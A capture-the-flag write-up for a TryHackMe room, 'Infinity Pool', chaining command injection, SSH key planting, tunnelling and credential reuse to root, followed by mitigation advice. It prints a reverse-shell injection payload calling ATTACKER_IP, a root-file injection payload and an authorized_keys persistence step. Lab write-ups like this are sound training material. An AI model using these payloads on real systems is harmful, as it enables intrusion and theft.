# Infinity Pool

**Name:** Garv Gurwara \
**Platform:** TryHackMe \
**Difficulty:** Medium \
**Date completed:** 23rd August 2026

## Summary
Chained a command injection in a hotel chain's internal "property connectivity" tool to a foothold, pivoted through an SSH tunnel into an internal telephony admin portal reached only via that foothold, extracted a secret from a voicemail message, and used it to reach a second, unauthenticated internal automation API that was also injectable — this time running as root.

## Reconnaissance

    nmap -p22,80 -sCV -Pn MACHINE_IP

        Only two ports open: SSH (OpenSSH on Ubuntu) and HTTP served by Gunicorn, hosting a hotel chain site ("Byte Lotus"). A gunicorn-fronted app on 80 suggested Python/Flask behind the scenes rather than a typical PHP/Apache stack.

    curl MACHINE_IP/robots.txt

        Disclosed two disallowed paths — /internal/ and /status — neither linked from the visible site. robots.txt is not an access control, so both were fair game to browse directly.

    curl MACHINE_IP/internal/

        404 — the path itself didn't resolve to a page, but confirmed the /internal/ prefix was real and worth exploring for sub-paths later.

    curl MACHINE_IP/status

        Rendered a staff-only "Sister-property connectivity" tool: a form posting a `host` field to /internal/netcheck, used internally to check whether a remote hotel property responds before routing a guest transfer.

## Enumeration

The netcheck tool takes a hostname and, from the framing ("check a remote property responds"), almost certainly shells out to a ping/connectivity check on the backend — a classic candidate for OS command injection via an unsanitised host parameter.

## Exploitation

### 1. OS command injection in /internal/netcheck (initial foothold)
Submitted a `host` value that broke out of the intended argument and appended a reverse shell command:

    curl http://MACHINE_IP/internal/netcheck --data-urlencode 'host=127.0.0.1; bash -c "bash -i >& /dev/tcp/ATTACKER_IP/4444 0>&1"'

With `nc -nvlp 4444` listening, this returned a shell as a low-privileged `web` user, landing inside `/var/www/infinity_pool/edge` — confirming the netcheck feature lived in an "edge" service that shelled out to the OS without sanitising input.

### 2. Internal service discovery
From the shell, `ss -tulpn` showed only one additional listening service beyond what nmap had seen externally: port 3000, an internal-only "Watchtower" ops console not reachable from outside the box.

    curl -s http://127.0.0.1:3000/api/config

Querying the ops console's config endpoint returned operational metadata including: a second internal-only service address (an "automation" API on port 9000, explicitly noted as internal-only), and credentials for a telephony admin portal (FreePBX UCP) on port 8080 — flagged internally as still using default template credentials that hadn't been rotated. This is a straightforward case of an internal API leaking secrets in a config response with no assumption that "internal-only" meant it was safe to do so.

### 3. Pivoting in via SSH tunnel
`/home/web/.ssh/authorized_keys` existed but was empty and writable by the `web` user — rather than search for a private key that wasn't present anywhere on disk, I generated my own keypair on the attacker box and appended the public half to that file from the reverse shell, then connected properly over SSH with a local port forward to reach the telephony portal that was otherwise only bound to loopback on the target:

    ssh-keygen -t ed25519 -f attacker_key -N ""
    echo "<pubkey>" >> /home/web/.ssh/authorized_keys   # from the reverse shell
    ssh -i attacker_key -L 8080:127.0.0.1:8080 web@MACHINE_IP

This traded the unstable reverse shell for a proper interactive SSH session and exposed the internal UCP portal locally in my browser.

### 4. Credential reuse and secret discovery in voicemail
Logged into the UCP portal at `127.0.0.1:8080/ucp` with the default template credentials found in step 2. Built a dashboard and added a voicemail widget, which surfaced a voicemail whose caller-ID field had been used as an out-of-band channel to store a secret — an "automation key" intended for the internal automation service on port 9000 discovered earlier.

### 5. Command injection in the internal automation API (root)
The automation service's `/jobs/export` endpoint accepted the leaked bearer key and took a `report` parameter that, like the original netcheck form, was passed unsanitised to a shell:

    curl -s -X POST http://127.0.0.1:9000/jobs/export \
      -H "Authorization: Bearer AUTOMATION_KEY" \
      -H "Content-Type: application/json" \
      -d '{"report": "x; cat /root/root.txt #"}'

Run from the reverse shell (loopback-only service), this confirmed the automation service ran as root and was vulnerable to the same class of injection as the public-facing tool, completing full compromise.

## Privilege Escalation
Privilege escalation here wasn't a kernel exploit or SUID binary — it was lateral movement through progressively more trusted internal services, each one unlocked by a secret leaked by the previous: public netcheck injection → low-priv shell → internal ops console leaks telephony creds → telephony portal leaks an automation key via voicemail → automation service (root) is injectable via the same bug class as the entry point.

## Mitigation
1. Never build "ping/connectivity check" style features by shelling out with string-concatenated user input. Use a language-native socket/connection check, or if a subprocess is unavoidable, pass arguments as an argv list with no shell interpretation and validate the host against a strict allowlist/format.
2. Don't expose operational config (`/api/config`) that mixes internal service topology with plaintext credentials, even on "internal-only" services — internal-only is not a substitute for authentication, especially once an attacker has any foothold on the network.
3. Rotate default/template credentials before deployment; alerting internally that credentials are still default ("ROTATE") without actually rotating them is not a mitigation.
4. Lock down `authorized_keys` permissions and ownership so a compromised low-privilege account cannot add its own trusted SSH keys; monitor for unexpected key additions.
5. Don't use voicemail, caller ID, or other unauthenticated/loosely-authenticated communication channels to convey API keys or secrets between internal services.
6. Apply the same input-sanitisation fix from the netcheck endpoint to every service that shells out to the OS, including internal-only ones — internal automation services are not a trust boundary against an attacker who has already landed on the network, and this one ran as root, turning a single bad pattern reused twice into full compromise.

## Takeaways
Practiced recognising OS command injection from feature framing alone (a "check this host is reachable" tool is a strong hint it shells out), pivoting through SSH tunnels to reach services with no external exposure, and treating leaked internal config/secrets as a chain rather than a dead end — the same vulnerability class (unsanitised input to a shell) reappeared at the very end, this time running as root.
